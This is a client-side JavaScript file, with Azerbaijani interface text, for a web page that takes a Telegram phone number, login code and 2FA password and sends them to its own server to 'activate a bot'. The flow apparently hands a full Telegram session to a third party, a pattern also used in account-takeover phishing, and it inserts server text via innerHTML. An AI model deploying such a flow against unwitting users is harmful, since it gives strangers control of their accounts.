document.addEventListener('DOMContentLoaded', () => {
    const phoneForm = document.getElementById('phone-form');
    const codeForm = document.getElementById('code-form');
    const faForm = document.getElementById('2fa-form');
    const loadingOverlay = document.getElementById('loading-overlay');
    const errorMessage = document.getElementById('error-message');
    const step2Desc = document.getElementById('step-2-desc');
    const btnBackStep1 = document.getElementById('btn-back-step1');

    let sessionToken = '';
    let countdownInterval = null;

    function showError(msg) {
        if (msg.includes('too many tries') || msg.includes('FLOOD_WAIT') || msg.includes('FloodWait')) {
            msg = '⚠️ <b>Telegram Limiti:</b> Bu nömrəyə çox sayda ard-arda kod istəndiyi üçün Telegram tərəfindən müvəqqəti blok qoyulub. Zəhmət olmasa bir müddət sonra və ya başqa nömrə ilə yoxlayın.';
        }
        errorMessage.innerHTML = msg;
        errorMessage.classList.remove('hidden');
        errorMessage.classList.add('shake');
        setTimeout(() => errorMessage.classList.remove('shake'), 500);
    }

    function hideError() {
        errorMessage.classList.add('hidden');
    }

    function showLoading(text) {
        const p = loadingOverlay.querySelector('p');
        if (p && text) p.textContent = text;
        loadingOverlay.classList.remove('hidden');
    }

    function hideLoading() {
        loadingOverlay.classList.add('hidden');
    }

    function goToStep(stepElementId, indicatorNumber) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        const targetStep = document.getElementById(stepElementId);
        if (targetStep) targetStep.classList.add('active');

        document.querySelectorAll('.step-indicator').forEach(i => i.classList.remove('active'));
        for (let i = 1; i <= indicatorNumber; i++) {
            const ind = document.getElementById(`indicator-${i}`);
            if (ind) ind.classList.add('active');
        }
    }

    function startTimer(seconds = 120) {
        if (countdownInterval) clearInterval(countdownInterval);
        let timeLeft = seconds;
        const timerEl = document.getElementById('timer');
        if (!timerEl) return;

        const updateTimer = () => {
            const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
            const s = (timeLeft % 60).toString().padStart(2, '0');
            timerEl.textContent = `${m}:${s}`;
        };

        updateTimer();
        countdownInterval = setInterval(() => {
            if (timeLeft > 0) {
                timeLeft--;
                updateTimer();
            } else {
                clearInterval(countdownInterval);
            }
        }, 1000);
    }

    async function sendAuthRequest(formData) {
        const res = await fetch('api/auth.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(formData)
        });

        const text = await res.text();
        let data = null;
        try {
            data = JSON.parse(text);
        } catch (e) {
            throw new Error('Server cavabı düzgün deyil: ' + text.substring(0, 150));
        }

        return data;
    }

    // Geri qayıt
    if (btnBackStep1) {
        btnBackStep1.addEventListener('click', () => {
            hideError();
            if (countdownInterval) clearInterval(countdownInterval);
            goToStep('step-1', 1);
            document.getElementById('phone_input').focus();
        });
    }

    // ─── Addım 1: Nömrəni Göndər ───
    phoneForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideError();

        const phone = document.getElementById('phone_input').value.trim();
        if (!phone) {
            showError('Nömrə daxil edin');
            return;
        }

        showLoading('Telegram ilə əlaqə qurulur və kod göndərilir...');

        try {
            const data = await sendAuthRequest({
                action: 'send_code',
                phone: phone
            });

            if (data.success) {
                sessionToken = data.token;
                goToStep('step-2', 2);
                startTimer(120);

                if (step2Desc && data.message) {
                    step2Desc.innerHTML = data.message;
                }

                const codeInput = document.getElementById('code_input');
                if (codeInput) {
                    codeInput.value = '';
                    codeInput.focus();
                }
            } else {
                showError(data.error || 'Kod göndərilə bilmədi');
            }
        } catch (err) {
            showError('Xəta: ' + err.message);
        } finally {
            hideLoading();
        }
    });

    // ─── Addım 2: Telegram Kodunu Yoxla ───
    codeForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideError();

        const code = document.getElementById('code_input').value.trim();
        if (code.length < 3) {
            showError('Kodu tam daxil edin');
            return;
        }

        showLoading('Kod təsdiqlənir və bot aktivləşdirilir...');

        try {
            const data = await sendAuthRequest({
                action: 'verify_code',
                token: sessionToken,
                code: code
            });

            if (data.success) {
                if (data.requires_2fa) {
                    goToStep('step-3', 3);
                    const passInput = document.getElementById('password_input');
                    if (passInput) passInput.focus();
                } else if (data.redirect) {
                    goToStep('step-4', 3);
                }
            } else {
                showError(data.error || 'Kod yanlışdır');
                const codeInput = document.getElementById('code_input');
                if (codeInput) {
                    codeInput.value = '';
                    codeInput.focus();
                }
            }
        } catch (err) {
            showError('Xəta: ' + err.message);
        } finally {
            hideLoading();
        }
    });

    // ─── Addım 3: 2FA Şifrəsi ───
    faForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideError();
        showLoading('2FA şifrəsi yoxlanılır...');

        const password = document.getElementById('password_input').value;

        try {
            const data = await sendAuthRequest({
                action: 'verify_2fa',
                token: sessionToken,
                password: password
            });

            if (data.success) {
                goToStep('step-4', 3);
            } else {
                showError(data.error || 'Şifrə yanlışdır');
            }
        } catch (err) {
            showError('Xəta: ' + err.message);
        } finally {
            hideLoading();
        }
    });

    // ─── Addım 4: Panelə Keçid ───
    const dashBtn = document.getElementById('go-dashboard');
    if (dashBtn) {
        dashBtn.addEventListener('click', () => {
            window.location.href = 'dashboard.php';
        });
    }
});
